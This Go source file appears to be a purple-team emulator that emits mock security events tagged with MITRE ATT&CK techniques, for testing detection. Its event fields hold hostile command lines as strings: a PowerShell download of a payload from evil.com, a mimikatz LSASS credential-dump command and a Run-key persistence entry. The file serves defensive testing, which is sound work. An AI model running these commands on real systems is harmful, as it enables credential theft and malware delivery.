package emulator

import (
	"context"
	"fmt"
	"log/slog"
	"os/exec"
	"path/filepath"
	"time"
)

// Emitter is a callback that receives raw emulated events.
type Emitter func(map[string]interface{})

// Emulator generates mock adversary events for purple-team testing.
type Emulator struct {
	emitFn Emitter
}

// New creates an emulator that will inject raw events via the provided emitter.
func New(fn Emitter) *Emulator {
	return &Emulator{emitFn: fn}
}

// Run executes the selected technique or scenario.
func (e *Emulator) Run(ctx context.Context, techniqueID, payload string) error {
	switch techniqueID {
	case "T1059.001":
		return e.powershellEncodedCommand(ctx, payload)
	case "T1566.001":
		return e.officeSpawning(ctx)
	case "T1003.001":
		return e.lsassAccess(ctx)
	case "T1547.001":
		return e.registryPersistence(ctx)
	case "T1071":
		return e.beaconing(ctx, payload)
	case "T1055":
		return e.processInjection(ctx)
	default:
		return fmt.Errorf("unknown technique %s", techniqueID)
	}
}

func (e *Emulator) emit(eventType string, overrides map[string]interface{}) {
	raw := map[string]interface{}{
		"event.type":     "emulation",
		"event.platform": "emulator",
		"event.provider": "ebm_emulator",
		"host.hostname":  "ebm-emulator-host",
		"severity":       "info",
	}
	for k, v := range overrides {
		raw[k] = v
	}
	if e.emitFn != nil {
		e.emitFn(raw)
	}
}

// T1059.001
func (e *Emulator) powershellEncodedCommand(ctx context.Context, payload string) error {
	slog.Info("emulation: T1059.001 PowerShell encoded command")
	cmd := exec.CommandContext(ctx, "echo", "simulated powershell -enc", payload)
	_ = cmd.Run()

	e.emit("process_start", map[string]interface{}{
		"process.name":         "powershell.exe",
		"process.command_line": fmt.Sprintf("powershell.exe -enc %s", payload),
		"process.parent.name":  "cmd.exe",
		"severity":             "high",
		"mitre.technique_id":   []string{"T1059.001"},
		"mitre.tactic":         "Execution",
	})
	return nil
}

// T1566.001
func (e *Emulator) officeSpawning(ctx context.Context) error {
	slog.Info("emulation: T1566.001 Office spawning suspicious child")
	e.emit("process_start", map[string]interface{}{
		"process.name":         "powershell.exe",
		"process.command_line": "powershell.exe -nop -c Invoke-WebRequest http://evil.com/payload.ps1",
		"process.parent.name":  "winword.exe",
		"severity":             "high",
		"mitre.technique_id":   []string{"T1566.001", "T1059.001"},
		"mitre.tactic":         "Initial Access",
	})
	return nil
}

// T1003.001
func (e *Emulator) lsassAccess(ctx context.Context) error {
	slog.Info("emulation: T1003.001 LSASS credential dumping")
	e.emit("process_access", map[string]interface{}{
		"process.name":        "mimikatz.exe",
		"process.command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
		"target.process.name":  "lsass.exe",
		"granted_access":       "0x1010",
		"severity":             "critical",
		"mitre.technique_id":   []string{"T1003.001"},
		"mitre.tactic":         "Credential Access",
	})
	return nil
}

// T1547.001
func (e *Emulator) registryPersistence(ctx context.Context) error {
	slog.Info("emulation: T1547.001 Registry Run key persistence")
	e.emit("registry_set", map[string]interface{}{
		"process.name":        "cmd.exe",
		"registry.path":       `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilUpdater`,
		"registry.value_data": `C:\Temp\evil.exe`,
		"severity":            "high",
		"mitre.technique_id":  []string{"T1547.001"},
		"mitre.tactic":        "Persistence",
	})
	return nil
}

// T1071
func (e *Emulator) beaconing(ctx context.Context, payload string) error {
	slog.Info("emulation: T1071 network beaconing")
	if payload == "" {
		payload = "evil.com"
	}
	for i := 0; i < 5; i++ {
		e.emit("network_connect", map[string]interface{}{
			"process.name":       "rundll32.exe",
			"destination.ip":     "185.220.101.47",
			"destination.port":   443,
			"destination.domain": payload,
			"source.ip":          "10.0.0.15",
			"network.direction":  "outbound",
			"severity":           "medium",
			"mitre.technique_id": []string{"T1071"},
			"mitre.tactic":       "Command and Control",
		})
		time.Sleep(2 * time.Second)
	}
	return nil
}

// T1055
func (e *Emulator) processInjection(ctx context.Context) error {
	slog.Info("emulation: T1055 process injection")
	e.emit("create_remote_thread", map[string]interface{}{
		"process.name":        "malware.exe",
		"target.process.name": "explorer.exe",
		"severity":            "critical",
		"mitre.technique_id":  []string{"T1055"},
		"mitre.tactic":        "Defense Evasion",
	})
	return nil
}

// RunScenario executes a multi-step adversary scenario.
func (e *Emulator) RunScenario(name string) error {
	switch name {
	case "ransomware_sim":
		return e.ransomwareScenario()
	default:
		return fmt.Errorf("unknown scenario %s", name)
	}
}

func (e *Emulator) ransomwareScenario() error {
	slog.Info("emulation: ransomware_sim scenario")
	dir := filepath.Join("/tmp", "ebm_test_data")
	_ = exec.Command("mkdir", "-p", dir).Run()

	for i := 0; i < 10; i++ {
		_ = exec.Command("touch", filepath.Join(dir, fmt.Sprintf("file_%d.docx", i))).Run()
	}

	for i := 0; i < 10; i++ {
		e.emit("file_create", map[string]interface{}{
			"file.path":          filepath.Join(dir, fmt.Sprintf("file_%d.encrypted", i)),
			"process.name":       "evil_ransomware.exe",
			"severity":           "critical",
			"mitre.technique_id": []string{"T1486"},
			"mitre.tactic":       "Impact",
		})
	}
	return nil
}
